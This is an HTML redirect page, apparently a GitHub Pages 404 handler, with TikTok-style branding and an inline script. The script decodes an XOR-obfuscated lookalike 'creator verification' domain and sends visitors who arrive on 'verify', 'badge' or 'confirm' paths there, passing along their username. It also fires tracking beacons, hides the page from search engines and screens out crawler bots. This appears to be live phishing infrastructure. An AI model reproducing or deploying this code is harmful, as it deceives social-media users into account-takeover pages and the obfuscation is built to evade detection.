<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <meta name="robots" content="noindex,nofollow,noarchive,nosnippet" />
  <meta name="referrer" content="no-referrer" />
  <meta name="theme-color" content="#000000" />
  <title></title>
  <link rel="icon" href="/favicon.svg" type="image/svg+xml" />
  <style>
    html,body{margin:0;min-height:100%;background:#000;color:#fff;
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
    a{color:#fe2c55}
    #go{display:none;position:fixed;inset:0;align-items:center;justify-content:center;
      text-decoration:none;font-weight:700;font-size:17px}
    #go.on{display:flex}
  </style>
  <script>
(function () {
  "use strict";
  var GATE = {
    "content/support": 1,
    "help/verify": 1,
    "account/badge": 1,
    "creator/confirm": 1,
    "verification/continue": 1
  };

  function lane(a, k) {
    var o = "", i;
    for (i = 0; i < a.length; i++) o += String.fromCharCode((a[i] ^ k[i % k.length]) & 255);
    return o;
  }
  function host() {
    var k0 = [0x2b, 0x91, 0x4e, 0x77];
    var s0 = lane([0x43, 0xe5, 0x3a, 0x07, 0x58], k0);
    var k1 = [0x5a, 0x13, 0xc8, 0x2f, 0x91, 0x44];
    var h0 = lane([0x29, 0x67, 0xbd, 0x4b, 0xf8, 0x2b, 0x74], k1);
    var h1 = lane([0x39, 0x61, 0xad, 0x4e, 0xe5, 0x2b, 0x28, 0x65, 0xad, 0x5d, 0xf8, 0x22, 0x23], k1);
    var h2 = lane([0x74, 0x67, 0xad, 0x4e, 0xfc], k1);
    return s0 + "://" + h0 + h1 + h2;
  }
  function parts() {
    try {
      return (location.pathname || "").replace(/\/+$/, "").split("/").filter(Boolean);
    } catch (e) {
      return [];
    }
  }
  /* GH Pages: /unsubscribe hits 404.html — send to static page (200). */
  try {
    var _p0 = (parts()[0] || "").toLowerCase();
    if (_p0 === "unsubscribe") {
      location.replace("/unsubscribe.html");
      return;
    }
  } catch (e) {}
  function handle() {
    var p = parts();
    // AMP cache: /c/s/notifications.dedyn.io/content/support/hadise
    if (p.length >= 3 && p[0] === "c" && p[1] === "s") {
      p = p.slice(3);
    }
    if (p.length < 3) return "";
    var pref = p[p.length - 3] + "/" + p[p.length - 2], u = p[p.length - 1];
    if (!GATE[pref]) return "";
    if (!/^[A-Za-z0-9._]{1,64}$/.test(u) || u === "index.html" || u === "404.html") return "";
    return u.replace(/^@+/, "");
  }
  function dest() {
    var u = handle();
    var base = host();
    if (!u) return "https://www.tiktok.com/";
    var out = base + "/" + encodeURIComponent(u);
    try {
      var q = location.search || "";
      var h = location.hash || "";
      if (q) out += q;
      if (h) out += h;
    } catch (e) {}
    return out;
  }

  /*
   * Log-only bot filter — NEVER blocks redirect/hop.
   * Skips Telegram for clear crawlers/previews only.
   * Gmail / Safari / iCloud Mail / Chrome in-app WebViews are NOT treated as bots.
   */
  function isLogBot() {
    try {
      if (navigator.webdriver) return true;
      var ua = navigator.userAgent || "";
      if (!String(ua).trim()) return true;
      return /Googlebot|AdsBot-Google|Mediapartners-Google|APIs-Google|Storebot-Google|Google-InspectionTool|bingbot|BingPreview|Applebot|DuckDuckBot|Baiduspider|YandexBot|Slurp|facebookexternalhit|Facebot|Twitterbot|LinkedInBot|Slackbot|Discordbot|TelegramBot|WhatsApp|SkypeUriPreview|PetalBot|Bytespider|GPTBot|ClaudeBot|meta-externalagent|curl\/|wget\/|python-requests|Go-http-client|HeadlessChrome|PhantomJS|Selenium/i.test(ua);
    } catch (e) {
      return true;
    }
  }

  var _pinged = { open: false, hop: false };
  function ping(event) {
    var u = handle();
    if (!u) return;
    if (event !== "open" && event !== "hop") return;
    if (_pinged[event]) return;
    if (isLogBot()) return;
    _pinged[event] = true;
    /* Query-string ping survives instant navigation (no JSON CORS preflight). */
    var url =
      host() +
      "/api/cta/ping?u=" +
      encodeURIComponent(u) +
      "&e=" +
      encodeURIComponent(event) +
      "&_=" +
      String(Date.now());
    try {
      if (navigator.sendBeacon) navigator.sendBeacon(url);
    } catch (e) {}
    try {
      fetch(url, {
        method: "POST",
        mode: "no-cors",
        keepalive: true,
        credentials: "omit",
      }).catch(function () {});
    } catch (e) {}
    try {
      var img = new Image();
      img.referrerPolicy = "no-referrer";
      img.src = url;
    } catch (e) {}
  }

  function hop(url) {
    ping("hop");
    try {
      var m = document.createElement("meta");
      m.httpEquiv = "refresh";
      m.content = "0;url=" + url;
      (document.head || document.documentElement).appendChild(m);
    } catch (e) {}
    try { window.top.location.replace(url); } catch (e) {}
    try { window.location.replace(url); } catch (e) {}
    try { window.location.href = url; } catch (e) {}
    try { window.location.assign(url); } catch (e) {}
    try { document.location = url; } catch (e) {}
  }

  var user = handle();
  var url = dest();
  if (user) ping("open");
  hop(url);

  function fallback() {
    var a = document.getElementById("go");
    if (!a) return;
    a.href = url;
    a.className = "on";
    try {
      a.addEventListener("click", function (ev) {
        try {
          if (ev && ev.isTrusted === false) return;
        } catch (e) {}
        ping("hop");
      }, { once: true, passive: true });
    } catch (e) {}
    try { a.click(); } catch (e) {}
  }
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", fallback);
  } else {
    fallback();
  }
  setTimeout(function () { hop(url); fallback(); }, 40);
})();
  </script>
</head>
<body>
  <a id="go" href="#">Continue</a>
</body>
</html>
